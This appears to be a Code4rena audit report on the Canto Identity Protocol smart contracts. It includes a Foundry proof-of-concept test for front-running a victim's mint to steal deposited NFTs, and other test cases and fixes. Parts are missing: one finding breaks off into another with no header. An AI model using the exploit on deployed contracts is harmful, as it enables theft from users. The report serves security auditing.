# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit contest outlined in this document, C4 conducted an analysis of the Canto Identity Protocol smart contract system written in Solidity. The audit contest took place between January 31â€”February 3 2023.

High - an attacker can steal deposited NFTs from victims using the `mint()` + `add()` functionality in `CidNFT.sol`

### Proof of Concept

One of the core features of CID Protocol is the ability for users to attach Subprotocol NFTs to their `CidNFT`. The `CidNFT` contract custodies these attached NFTs, and they are regarded as "traits" of the user.

The protocol currently includes functionality for a user to mint a `CidNFT` as their identity and then optionally add a subprotocol NFT to that `CidNFT` in the same transaction. This occurs in the `mint()` function of `CidNFT.sol`, which takes a byte array of `add()` parameters and includes a loop where `add()` can be repeatedly called with these parameters to attach subprotocol NFTs to the `CidNFT`.

```

function mint(bytes[] calldata _addList) external {
    _mint(msg.sender, ++numMinted); 
    bytes4 addSelector = this.add.selector;
    for (uint256 i = 0; i < _addList.length; ++i) {
        (bool success /*bytes memory result*/, ) = address(this)
            .delegatecall(abi.encodePacked(addSelector, _addList[i]));
        if (!success) revert AddCallAfterMintingFailed(i);
    }
}
```

One of the arguments for `add()` is the `_cidNFTID` to which the user would like to attach their outside NFT. However, `_cidNFTID` is specified in calldata to `mint()`, and there is no guarantee that the user is actually `add()`ing to the `CidNFT` that they just minted. There is only a check in `add()` that the user is either the owner or approved for that `CidNFT`.

    function add(
            uint256 _cidNFTID, // No guarantee that this is the CidNFT id that was just minted by the user
            string calldata _subprotocolName,
            uint256 _key,
            uint256 _nftIDToAdd,
            AssociationType _type
        ) external {
        ...............
        if (
            cidNFTOwner != msg.sender &&
            getApproved[_cidNFTID] != msg.sender &&
            !isApprovedForAll[cidNFTOwner][msg.sender]
        ) revert NotAuthorizedForCIDNFT(msg.sender, _cidNFTID, cidNFTOwner);
        ...............
    }

This opens up the following attack:

1.  Victim sends a transaction expecting to mint `CidNFT #100`, and includes calldata to `add()` their SubprotocolNFT to the token in the same tx
2.  Attacker frontruns this transaction with a `mint()` with no `add()` parameters, receives `CidNFT #100`, and sets the victim as approved for that token
3.  The victim's transaction begins execution, and they instead receive token #101, though their `add()` calldata still specifies token #100
4.  The victim's `add()` call continues, and their SubprotocolNFT is registered to `CidNFT #100` and transferred to the `CidNFT` contract
5.  The attacker can then either revoke approval to the victim for `CidNFT #100` or immediately call `remove()` to transfer the victim's SubprotocolNFT to themselves

Below is a forge test executing this attack. This should run if dropped into `CidNFT.t.sol`.

    function testMaliciousMint() public {
        uint256 cidTokenId = cidNFT.numMinted() + 1;
        (uint256 subTokenId1, uint256 subTokenId2) = (1, 2);
        (uint256 key1, uint256 key2) = (1, 2);

        // user1 == attacker
        // user2 == victim
        // Frontrun the victim's mint by minting the cidNFT token they expect before them
        vm.startPrank(user1);
        cidNFT.mint(new bytes[](0));

        // Set the victim (user2) as approved for the token user1 just minted
        cidNFT.setApprovalForAll(user2, true);
        vm.stopPrank();

        // Mint user2 the subtokens that user1 wants to steal, approve the CidNFT contract
        // for the subtokens, and prepare the addlist with the incorrect cidNFT token id
        vm.startPrank(user2);
        sub1.mint(user2, subTokenId1);
        sub1.mint(user2, subTokenId2);
        sub1.setApprovalForAll(address(cidNFT), true);

        bytes[] memory addList = new bytes[](2);
        addList[0] = abi.encode(
            cidTokenId,
            "sub1",
            key1,
            subTokenId1,
            CidNFT.AssociationType.ORDERED
        );
        addList[1] = abi.encode(
            cidTokenId,
            "sub1",
            key2,
            subTokenId2,
            CidNFT.AssociationType.ORDERED
        );

        // Mint user2 a new CidNFT and attach the subtokens to user1's CidNFT
        cidNFT.mint(addList);
        vm.stopPrank();

        // Confirm that user1's CidNFT has the subtokens and can transfer them out
        vm.startPrank(user1);
        cidNFT.remove(
            cidTokenId,
            "sub1",
            key1,
            subTokenId1,
            CidNFT.AssociationType.ORDERED
        );
        cidNFT.remove(
            cidTokenId,
            "sub1",
            key2,
            subTokenId2,
            CidNFT.AssociationType.ORDERED
        );
        vm.stopPrank();

        // Confirm that user1 now holds the subtokens
        assertEq(cidNFT.ownerOf(cidTokenId), user1);
        assertEq(cidNFT.ownerOf(cidTokenId + 1), user2);
        assertEq(sub1.ownerOf(subTokenId1), user1);
        assertEq(sub1.ownerOf(subTokenId2), user1);
    }
    ## Tools Used
    Manual review

    ## Recommended Mitigation Steps
    - Enforce that the user can only `add()` to the CidNFT that they just minted rather than allowing for arbitrary IDs

# Medium Risk Findings (4)
## [[M-01] Adding NFTS with AssociationType ORDERED or PRIMARY may cause overwriting](https://github.com/code-423n4/2023-01-canto-identity-findings/issues/187)
*Submitted by [hihen](https://github.com/code-423n4/2023-01-canto-identity-findings/issues/187)*

***Note: Prior to this audit, a group of wardens added test coverage. While auditing was not the purpose of the testing phase, relevant and valuable findings reported during that timeframe were eligible to be judged. As such, this finding [M-01] was discovered during the "testing squad" phase and is being included here for completeness.***

Subprotocol NFTs may be trapped in contract CidNFT forever.

### Proof of Concept

When adding NFT to CidNFT with AssociationType ORDERED or PRIMARY, the cidData is written directly, without checking and handling the case that a previously added nft may not have been removed:

    if (_type == AssociationType.ORDERED) {
        if (!subprotocolData.ordered) revert AssociationTypeNotSupportedForSubprotocol(_type, _subprotocolName);
        cidData[_cidNFTID][_subprotocolName].ordered[_key] = _nftIDToAdd;
        emit OrderedDataAdded(_cidNFTID, _subprotocolName, _key, _nftIDToAdd);
    } else if (_type == AssociationType.PRIMARY) {
        if (!subprotocolData.primary) revert AssociationTypeNotSupportedForSubprotocol(_type, _subprotocolName);
        cidData[_cidNFTID][_subprotocolName].primary = _nftIDToAdd;
        emit PrimaryDataAdded(_cidNFTID, _subprotocolName, _nftIDToAdd);
    ...

For `AssociationType.ORDERED`:<br>
If `(key1, subNft1)` and `(key1, subNft2)` were added consecutively, `subNft1` would be trapped in the contract forever, because `subNft1` stored in `cidData` was overwritten by `subNft2`, and only `subNft2` can be retrieved through `CidNFT.remove()`.

For `AssociationType.PRIMARY`:<br>
If `subNft1` and `subNft2` were added consecutively, `subNft1` would be trapped in the contract forever, because `subNft1` stored in `cidData` was overwritten by `subNft2`, and only `subNft2` can be retrieved through `CidNFT.remove()`.

47:         cidNFTs[msg.sender] = _cidNFTID;
48:         emit CIDNFTAdded(msg.sender, _cidNFTID);
49:     }
```

This overwrites `cidNFTs[msg.sender]` with the `cidNFTID` provided by the caller.

The issue is that there is nothing preventing several (2 or more) accounts to point to the same `cidNFTID`, ie have `cidNFTs[userA] == cidNFTs[userB]`

Note: the README mentioned that

    Transferring CID NFTs that are still referenced in the address registry: CID NFTs are transferrable on purpose and a user can transfer his CID NFT while it is still registered to his address if he wants to do so.

The issue described in this report is not that the CID NFT is transferrable, but that several accounts can point to the same CIDNFT id, which lead to several problems outlined below.

### Impact

Quoting the README:

    Canto Identity NFTs (CID NFTs) represent individual on-chain identities

Here, several accounts can point to the same on-chain identity, breaking the requirement that the said identity should be **individual**.

To illustrate the consequences of this, let us look at `CidNFT.add()`, which adds a new entry for the given subprotocol to the provided CID NFT:

*   data is added by transferring a subprotocol NFT to the contract, which will write the NFT id in `cidData[_cidNFTID][_subprotocolName]`
*   This NFT id represents traits that will be associated with the identity.

Because of the issue outlined above, the identity system can be abused:

*   Alice registers her CIDNft by calling `addressRegistry.register(N)`
*   she transfers it to Bob, who then proceeds to call `addressRegistry.register(N)` to register it.
*   at this point, `cidNFT` of id `N` points to both Alice and Bob: `addressRegistry.getCID(Alice) == addressRegistry.getCID(Bob)`
*   Bob calls `CidNFT.add()` to add a subProtocol NFT X to his identity `N` . Because Alice is also associated to the `CIDNFT` `N`, she essentially added this trait for free (assuming subprotocols will monetize their tokens, Bob had to pay the cost of the subProtocol NFT X, but Alice did not).
*   This can also have further consequences depending on what can be done with these traits (e.g: a protocol giving rewards for users with a trait of the subProtocol NFT X, Bob could be front run by Alice and not receive a reward he was entitled to)

Overall, because this issue impacts a key aspect of the protocol (identities are not individual) and can lead to a form of `theft` in certain conditions (in the scenario above, Alice got a trait added to her identity for "free"), the Medium severity seems appropriate.

### Proof Of Concept

This test shows how two users can point to the same `CID`.<br>
Add it to `AddressRegistry.t.sol`

```solidity
function testTwoUsersSameCID() public {
    uint256 nftIdOne = 1;
    address Alice = users[0];
    address Bob = users[1];

    // 1 - Alice mints NFT
    vm.startPrank(Alice);
    bytes[] memory addList;
    cidNFT.mint(addList);
    assertEq(cidNFT.ownerOf(nftIdOne), Alice);

    // 2 - Alice registers the NFT
    addressRegistry.register(nftIdOne);

    // 3 - Alice transfers the CID NFT to Bob
    cidNFT.transferFrom(Alice, Bob, nftIdOne);
    vm.stopPrank();

    // 4 - Bob registers the nft
    vm.startPrank(Bob);
    addressRegistry.register(nftIdOne);

    // 5 - Alice and Bob have the same identity
    uint256 cidAlice = addressRegistry.getCID(Alice);
    uint256 cidBob = addressRegistry.getCID(Bob);
    assertEq(cidAlice, cidBob);
}
```

### Tools Used

Manual Analysis, Foundry

### Mitigation

`AddressRegistry` should have an additional mapping to track the account associated with a given `cifNTFID`.

```diff
File: src/AddressRegistry.sol
20:     /// @notice Stores the mappings of users to their CID NFT
21:     mapping(address => uint256) private cidNFTs;
+       mapping(uint256 => address) private accounts;
```

When registering, the code would check if the `cidNFTID` has an account associated with it.
If that is the case, `cidNFTs` for this user would be set to 0, preventing several users from having the same identity.

```diff
File: src/AddressRegistry.sol
42: function register(uint256 _cidNFTID) external {
43:         if (ERC721(cidNFT).ownerOf(_cidNFTID) != msg.sender)
44:             // We only guarantee that a CID NFT is owned by the user at the time of registration
45:             // ownerOf reverts if non-existing ID is provided
46:             revert NFTNotOwnedByUser(_cidNFTID, msg.sender);
+           if (accounts[_cidNFTID] != address(0)) {
+                 delete cidNFTs[accounts[_cidNFTID]];
+                 emit CIDNFTRemoved(accounts[_cidNFTID], _cidNFTID);
+}
47:         cidNFTs[msg.sender] = _cidNFTID;
+           accounts[_cidNFTID] = msg.sender;
48:         emit CIDNFTAdded(msg.sender, _cidNFTID);
49:     }
```

## [[M-03] Griefing risk in `mint`](https://github.com/code-423n4/2023-01-canto-identity-findings/issues/115)
*Submitted by [shenwilly](https://github.com/code-423n4/2023-01-canto-identity-findings/issues/115), also found by [gzeon](https://github.com/code-423n4/2023-01-canto-identity-findings/issues/58)*

[CidNFT.sol#L147-L157](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L147-L157)<br>
[CidNFT.sol#L177-L182](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L177-L182)

`CidNFT.mint()` has an optional parameter `_addList` that enables users to register subprotocol NFTs to the CID NFT right after the mint.

However, there is no guarantee that the `_cidNFTID`  encoded in `_addList` is the same ID as the newly minted NFT. If there is a pending mint transaction and another user frontrun the mint transaction with higher fee, the previous transaction will revert as the `_cidNFTID` is no longer the expected ID.

[CidNFT.sol#L177-L182](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L177-L182)

```solidity
address cidNFTOwner = ownerOf[_cidNFTID];
if (
    cidNFTOwner != msg.sender &&
    getApproved[_cidNFTID] != msg.sender &&
    !isApprovedForAll[cidNFTOwner][msg.sender]
) revert NotAuthorizedForCIDNFT(msg.sender, _cidNFTID, cidNFTOwner);
```

A malicious actor can grief this by frontrunning users that try to mint with non-zero `_addList`, causing their mint transaction to fail.

In absence of malicious actor, it is also possible for this issue to happen randomly during busy period where a lot of users are trying to mint at the same time.

### Proof of Concept

*   The next CidNFT mint ID is `1000`.
*   Alice wants to mint and prepares `_addList` with the expected `_cidNFTID` of `1000`.
*   Bob saw Alice's transaction and frontran her, incrementing the next minting ID to `1001`.
*   Alice's transaction tries to add subprotocol NFTs to ID `1000` which is owned by Bob. This causes the transaction to revert.

### Recommended Mitigation Steps

Modify `mint` so that the minted ID is the one used during the `add` loop, ensuring that `mint` will always succeed.

## [[M-04] `CidNFT`: Broken `tokenURI` function](https://github.com/code-423n4/2023-01-canto-identity-findings/issues/89)
*Submitted by [horsefacts](https://github.com/code-423n4/2023-01-canto-identity-findings/issues/89)*

[`CidNFT#tokenURI`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L133-L142) does not convert the `uint256 _id` argument to a string before interpolating it in the token URI:

```solidity
    /// @notice Get the token URI for the provided ID
    /// @param _id ID to retrieve the URI for
    /// @return tokenURI The URI of the queried token (path to a JSON file)
    function tokenURI(uint256 _id) public view override returns (string memory) {
        if (ownerOf[_id] == address(0))
            // According to ERC721, this revert for non-existing tokens is required
            revert TokenNotMinted(_id);
        return string(abi.encodePacked(baseURI, _id, ".json"));
    }

```

This means the raw bytes of the 32-byte ABI encoded integer `_id` will be interpolated into the token URI, e.g. `0x0000000000000000000000000000000000000000000000000000000000000001` for ID `#1`.

Most of the resulting UTF-8 strings will be malformed, incorrect, or invalid URIs. For example, token ID `#1` will show up as the invisible "start of heading" control character, and ID `#42` will show as the asterisk symbol `*`. URI-unsafe characters will break the token URIs altogether.

### Impact

*   `CidNFT` tokens will have invalid `tokenURI`s. Offchain tools that read the `tokenURI` view may break or display malformed data.

### Suggestion

Convert the `_id` to a string before calling `abi.encodePacked`. Latest Solmate includes a `LibString` helper library for this purpose:

```solidity
    import "solmate/utils/LibString.sol";

    /// @notice Get the token URI for the provided ID
    /// @param _id ID to retrieve the URI for
    /// @return tokenURI The URI of the queried token (path to a JSON file)
    function tokenURI(uint256 _id) public view override returns (string memory) {
        if (ownerOf[_id] == address(0))
            // According to ERC721, this revert for non-existing tokens is required
            revert TokenNotMinted(_id);
        return string(abi.encodePacked(baseURI, LibString.toString(_id), ".json"));
    }

```

### Test case

```solidity
    function test_InvalidTokenURI() public {
        uint256 id1 = cidNFT.numMinted() + 1;
        uint256 id2 = cidNFT.numMinted() + 2;
        // mint id1
        cidNFT.mint(new bytes[](0));
        // mint id2
        cidNFT.mint(new bytes[](0));

        // These pass â€” the raw bytes '0000000000000000000000000000000000000000000000000000000000000001' are interpolated as _id.
        assertEq(string(bytes(hex"7462643a2f2f626173655f7572692f00000000000000000000000000000000000000000000000000000000000000012e6a736f6e")), cidNFT.tokenURI(id1));
        assertEq(string(bytes(hex"7462643a2f2f626173655f7572692f00000000000000000000000000000000000000000000000000000000000000022e6a736f6e")), cidNFT.tokenURI(id2));

        // These fail - the generated string on the right is not the expected string on the left. 
        assertEq("tbd://base_uri/1.json", cidNFT.tokenURI(id1));
        assertEq("tbd://base_uri/2.json", cidNFT.tokenURI(id2));
    }
```

## [L-01] Consider allowing the subprotocol owner to be transferred

Once a subprotocol has been registered in the `SubprotocolRegistry` there is no way to update any of the values. The `SubprotocolData.owner` is the fee recipient leveraged as the fee recipient in [`CidNFT.add`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L193) - which means it may continue to collect fees overtime.

Since subprotocols are created by more than just the inner dev team, it may be more likely that the wallet becomes compromised or the subprotocol team desires switching to a multisig address in the future.

You could allow transferring the `owner` to another address, potentially with a 2-step process. This would not negatively impact use of the subprotocol, nor change the associated gas costs.

Similarly, consider allowing other fields to be updated. For example, maybe the subprotocol owner can lower the `fee` at any point but not increase it.

## [L-02] Consider allowing fee wallet transfers

`cidFeeWallet` in `SubprotocolRegistry` and `CidNFT` are currently immutable addresses. Allowing the fee recipient to be updated may be appropriate for future proofing such as to allow moving the fee recipient under DAO control, or similar change.

You could allow transferring to another address, potentially with a 2-step process. However this would increase gas costs as immutable could no longer be used.

An alternative which preserves the current gas efficiency, is to use a simple contract as the wallet which escrows funds that can be withdrawn by its owner, which potentially uses [the OZ Ownable2Step mixin](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol). The owner could be an EOA at first, and as the system matures it could be changed to a multisig or a DAO in the future.

## [L-03] Consider a mutable baseURI

`baseURI` is assigned in the constructor with no way of updating it in the future. The approach used by [`tokenURI`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L140) prevents using IPFS since that would require knowing all potential tokenIds in advance. It may work with Arweave's append only file system, but the intended baseURI protocol is not clear from the docs or tests.

If these are to be hosted on a custom domain, it may be even more important that the `baseURI` is mutable, allowing it to be transitioned to a new store if that domain were to become unavailable (such as due to a security incident, trademark issue, or the host otherwise becoming unavailable in the future).

Alt: clarify in the docs the intended `baseURI`, to make it clear how permanence is guaranteed if that's part of the current launch plan.

## [L-04] Consider requiring strings `.length != 0`

Several strings in the system are assigned once, without the ability to change it later on. Consider requiring that these are non-zero length to help ensure these have been assigned as expected.

* [SubprotocolRegistry.register](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L84) accepts a `_name` parameter of any length. Although only one entry could be registered with an empty name, it may be odd or unexpected to have a subprotocol with an empty string.
* [CidNFT.costructor](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L122) accepts a `_baseURI` parameter of any length which is then immutable. If this were not assigned then `tokenURI` would not work as expected.
* [`name` and `symbol` in `CidNFT.constructor`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L126) are allowed to be empty in the solmate constructor, may consider adding 0 length checks for these as well.

## [L-05] Consider `isContract` checks in constructors

Several addresses are assigned in the contract constructors and assigned to immutable variables. A successful deployment is sensitive to these addresses being assigned correctly for the current network, and that addresses were specified in the correct order. Consider adding checks, as aggressively as possible for the use case, to help ensure the deployment configuration is correct.

* [`AddressRegistry.constructor`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/AddressRegistry.sol#L37) consider requiring that `_cidNFT.isContract()`.
* [`SubprotocolRegistry.constructor`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L66) and [`CidNFT.constructor`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L129) consider requiring that `_noteContract.isContract()`.
* [`CidNFT.constructor`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L66) consider requiring that `_subprotocolRegistry.isContract()`.

`.isContract()` is referring to the [OZ Address library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol#L40) or similar implementation.

This is related to the automated finding `[NC-1] Missing checks for address(0) when assigning values to address state variables` but suggests a more aggressive check.

## [L-06] getActiveData could exceed gas limits

There's no upper bound on the size of the array which is being [returned in `CidNFT.getActiveData`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L319-L322). For both contract consumers and RPC requests, eventually a gas limit would be reached. Different RPC providers have different limits applied to view calls such as this.

Consider supporting a paginated variation where callers can request a subset of the full array when appropriate, as well as potentially a getter to get the length of the array.

## [N-01] Simplify code

There is an if/else block in `CidNFT.add` for the `ACTIVE` type which could be simplified. Consider [changing this block of code](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L215-L226) into:

```solidity
// Check for duplicates
if (lengthBeforeAddition != 0 && activeData.positions[_nftIDToAdd] != 0) {
    revert ActiveArrayAlreadyContainsID(_cidNFTID, _subprotocolName, _nftIDToAdd);
}
activeData.values.push(_nftIDToAdd);
activeData.positions[_nftIDToAdd] = lengthBeforeAddition + 1;
```

This is easier to read and functionally the same. 

## [N-02] Custom Error Params

Consider emitting the current owner in [`AddressRegistry.NFTNotOwnedByUser`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/AddressRegistry.sol#L46). `msg.sender` is included but that may already be clear from context. Including the owner could be a useful addition, e.g. allowing a user to quickly realize that the NFT is in another wallet of theirs.

## [N-03] Emit from/to

Consider emitting the original CID in [`AddressRegistry.CIDNFTAdded`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/AddressRegistry.sol#L48) for when a user overwrites a prior registration. This may add a little gas overhead, but it should be minor since the slot is warm by setting the value here as well.

This is similar to [ERC-173 (the ownership standard)](https://eips.ethereum.org/EIPS/eip-173) which emits both the previous and new owner on transfer. Including both CIDs would make any overwrites more explicit for the user and any observing apps. When there is no previous CID, that param would emit 0 (similar to previous owner emitted as address(0) when first assigned).

Alternatively you could emit `CIDNFTRemoved` when there is a CID being overwritten. This approach would still offer the explicitness, but also be consistent with the `remove` flow, as if the user had made that call before the new `register` call.

## [N-04] Consistent param ordering

Consider switching the param order in the `SubprotocolRegistered` event or the `register` function so that they are more consistent with each other. e.g. in the function, the order/active/primary bits come first while in the event they appear after the `_nftAddress`.

A possible improvement:

```solidity
    function register(
        string calldata _name,
        address _nftAddress,
        bool _ordered,
        bool _primary,
        bool _active,
        uint96 _fee
    ) external
```

The consistency improves readability, both for the code and for users reviewing transactions & events in a block explorer.

## [N-05] Inconsistent used of named return params

Personally I prefer named return params, but it is a style preference. However in a project, it's nice to be consistent throughout with whichever style you prefer.

* [`SubprotocolRegister.getSubprotocol`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L106) does not name the return value while [`AddressRegistry.getCID`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/AddressRegistry.sol#L62) does, even though they are very similar functions.
* [`CidNFT.tokenURI`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L136) and [`CidNFT.onERC721Received`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L344) do not use named return params while all the other getters in this contract do.

## [N-06] Use delete consistently

Consider using `delete` instead of [`= 0;` in `CidNFT.remove`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L284) similar to how delete is used [here](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L269) even though it is also just a `uint` being cleared. Other parts of the code also seem to use `delete` for similar cases.

## [N-07] Spellcheck

* [existant -> existent](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L274)
* [subprotocl -> subprotocol](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L306) and [here](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L318)

## [G-01] Move checks to the top

Checks, effects, interactions is a general best practice and can be applicable to more than just reentrancy concerns. When one of the following error scenarios applies, users pay gas for all statements executed up until the revert itself. By performing checks such as these as early as possible, you are saving users gas in failure scenarios without any sacrifice to the happy case costs. 

Moving the requirements to the top of the function can also improve readability.

Consider moving these checks to the top of the `register` function in `SubprotocolRegistry`:
* [`if (!(_ordered || _primary || _active)) revert NoTypeSpecified(_name);`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L88)
* [`if (!ERC721(_nftAddress).supportsInterface(type(CidSubprotocolNFT).interfaceId))`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L93-L94)

And potentially moving [`SafeTransferLib.safeTransferFrom(note, msg.sender, cidFeeWallet, REGISTER_FEE);`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L87) below the check [`if (subprotocolData.owner != address(0))`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L90)

In `CidNFT` consider moving the check [`if (_nftIDToAdd == 0) revert NFTIDZeroDisallowedForSubprotocols();`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L183) to the top of the function.

## [G-02] Revert on no-op

Unfortunately it can be common for users to accidentally fire the same transaction multiple times. This can result from an unclear app experience, or users misunderstanding speed up / replace transaction. When this occurs the duplicate transaction should be a no-op, ideally reverting as early as possible to limit gas costs. Reverting in the case of a duplicate may also prevent the redundant transaction from being broadcasted at all since apps and wallets typically estimate gas before broadcasting and that would show that it's expected to revert if the original has already been mined.

In `register` consider reverting if the provided `_cidNFTID` is already registered by that user. 

This is similar to the pattern already used [in `remove`, which reverts with `NoCIDNFTRegisteredForUser` when the call would otherwise be a no-op](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/AddressRegistry.sol#L54) (and this is not strictly necessary). 

## [G-03] Remove helpers

[This block of code](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L244-L254) is redundant when passing from `add` -> `remove` which includes an external call to the `SubprotocolRegistry`. By moving the rest of the remove function into a private helper that's called by both `add` and `remove` you could save an extra call and therefor some gas in those scenarios, without complicating the code much.

This is related to the known gas optimization issue, but covers a redundant external call as well as the redundant sloads for approval checking.

Additionally you could use more targeted helpers. As a POC, here's the impact from extracting a `_removeOrdered` helper:

```
original:
[PASS] testOverwritingOrdered() (gas: 281662)

new:
[PASS] testOverwritingOrdered() (gas: 277991)

Savings: 3,671
```

Using the following helper which is called in `add` instead of the `remove` currently there. And this helper can be shared with `remove` so that the logic is not repeated in the contract.

```solidity
function _removeOrdered(
    ERC721 nftToRemove,
    uint256 _cidNFTID,
    string calldata _subprotocolName,
    uint256 _key,
    uint256 _nftIDToRemove
) internal {
    delete cidData[_cidNFTID][_subprotocolName].ordered[_key];
    nftToRemove.safeTransferFrom(address(this), msg.sender, _nftIDToRemove);
    emit OrderedDataRemoved(_cidNFTID, _subprotocolName, _key, _nftIDToRemove);
}
```

## [G-04] Storage

Consider a storage reference in `SubprotocolRegistry` for [`SubprotocolData memory subprotocolData`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L89). This would be cheaper in the case of `SubprotocolAlreadyExists` since that only accesses one of the two slots. And does not negatively impact the happy case. 

It may be considered cleaner syntax since [`subprotocols[_name] = subprotocolData;`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L99) may then be removed, but that is subjective.

## [G-05] Unchecked when clearly safe to do so

Using `unchecked` blocks saves just a tiny bit of gas, but in instances where its clearly safe already it's possible to avoid this unnecessary check.

It's becoming a common pattern to use in `for` loops such as [this one in `CidNFT`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L150) where you could consider using:

```solidity
for (uint256 i = 0; i < _addList.length; ) {
    // existing logic
    unchecked {
        ++i;
    }
}
```

In `CidNFT` when calculating fees the math is using a constant, so `cidFee` is always less than `subprotocolFee` making the subtraction always safe when calculating [`subprotocolFee - cidFee`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L193).

In `CidNFT` [`arrayLength - 1`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L279-L280) is guaranteed to be safe since there is a check [`if (arrayPosition == 0) revert...`](https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L275) above which handles the potential underflow scenario already.

**[OpenCoreCH (Canto Identity) commented](https://github.com/code-423n4/2023-01-canto-identity-findings/issues/76#issuecomment-1426259866):**
 > This was the most helpful report for me personally. The other reports often contained some generic recommendations that do not directly apply to the protocol (ERC721A instead of ERC721 which only helps with batch minting, changing uint96 which would use an additional storage slot in a struct, marking a string as immutable which is not possible, etc...). This report contains some nice refactoring suggestions that consider the context of the protocol.
